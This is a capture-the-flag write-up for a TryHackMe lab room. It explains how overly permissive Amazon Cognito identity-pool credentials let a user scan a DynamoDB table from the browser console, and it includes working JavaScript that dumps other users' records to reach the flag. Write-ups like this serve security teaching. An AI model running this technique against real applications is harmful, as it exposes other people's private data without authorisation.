# URL
https://tryhackme.com/room/hh-complimentary-05e0b604/
# Concepts
* using web browser console commands
* abusing AWS credentials for broken access control
# Method of solve
* this app uses Amazon Cognito identity pools to provide access to the DynamoDB database function provided by AWS
* we can test the identity pool permissions to see if we can read other users' entries from database
* run this code from the app's web browser console
```JS
var dynamodb = new AWS.DynamoDB({ region: "us-east-1" });

dynamodb.scan({
    TableName: "complimentary-GuestWellnessProfiles"
}, function(err, data) {
    if (err) {
        console.log("❌ Error:", err.message);
    } else {
        console.log("🔓 Items retrieved successfully:", data.Items);
        console.log("Total items found:", data.Count);
    }
});
```
* we return a number of other user's entries
* the fourth entry contains the flag
